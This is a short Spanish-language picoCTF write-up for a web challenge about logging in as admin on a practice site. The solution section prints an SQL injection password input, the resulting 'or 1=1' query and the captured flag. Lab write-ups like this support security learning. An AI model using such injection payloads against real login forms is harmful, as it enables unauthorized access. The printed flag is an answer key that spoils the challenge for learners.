Puntos: 400pts
# Objetivo del Nivel

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

# Pistas del Nivel

- Seems like the password is encrypted.
# Solución/Resultado/Flag

```html
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```

picoCTF{3v3n_m0r3_SQL_4424e7af}
# Notas Adicionales
# Referencias

https://play.picoctf.org/practice/challenge/80